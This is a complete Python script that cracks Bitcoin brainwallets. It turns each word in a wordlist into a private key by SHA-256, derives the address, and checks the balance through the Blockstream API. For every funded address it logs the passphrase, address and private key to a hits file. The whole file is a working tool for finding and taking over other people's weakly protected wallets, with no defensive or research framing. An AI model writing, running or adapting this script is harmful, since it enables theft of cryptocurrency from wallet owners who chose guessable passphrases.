import hashlib
import base58
import requests
import time
from ecdsa import SECP256k1, SigningKey

def passphrase_to_private_key(passphrase):
    return hashlib.sha256(passphrase.encode('utf-8')).hexdigest()

def private_key_to_public_key(private_key_hex):
    private_key_bytes = bytes.fromhex(private_key_hex)
    sk = SigningKey.from_string(private_key_bytes, curve=SECP256k1)
    vk = sk.verifying_key
    public_key_bytes = b'\x04' + vk.to_string()
    return public_key_bytes

def public_key_to_address(public_key_bytes):
    sha256_bpk = hashlib.sha256(public_key_bytes).digest()
    ripemd160_bpk = hashlib.new('ripemd160', sha256_bpk).digest()
    prefixed = b'\x00' + ripemd160_bpk
    checksum = hashlib.sha256(hashlib.sha256(prefixed).digest()).digest()[:4]
    binary_address = prefixed + checksum
    return base58.b58encode(binary_address).decode('utf-8')

def get_balance_blockstream(address):
    try:
        url = f"https://blockstream.info/api/address/{address}"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            confirmed = data['chain_stats']['funded_txo_sum'] - data['chain_stats']['spent_txo_sum']
            return confirmed / 100_000_000  # Convert to BTC
        else:
            print(f"❌ API error: {response.status_code}")
            return None
    except Exception as e:
        print(f"❌ Connection error: {e}")
        return None

def main():
    with open("wordlist.txt", "r", encoding="utf-8", errors="ignore") as f:
        words = f.read().splitlines()

    for word in words:
        print(f"\n🔍 Checking passphrase: {word}")
        priv = passphrase_to_private_key(word)
        pub = private_key_to_public_key(priv)
        addr = public_key_to_address(pub)
        print(f"Address: {addr}")

        balance = get_balance_blockstream(addr)
        if balance is not None:
            if balance > 0:
                print(f"💰 FOUND! Balance: {balance} BTC")
                with open("hits.txt", "a") as hit_file:
                    hit_file.write(f"{word} | {addr} | {priv} | {balance} BTC\n")
            else:
                print("❌ No balance.")
        else:
            print("⚠️ Skipped due to API error.")
        time.sleep(1)

if __name__ == "__main__":
    main()
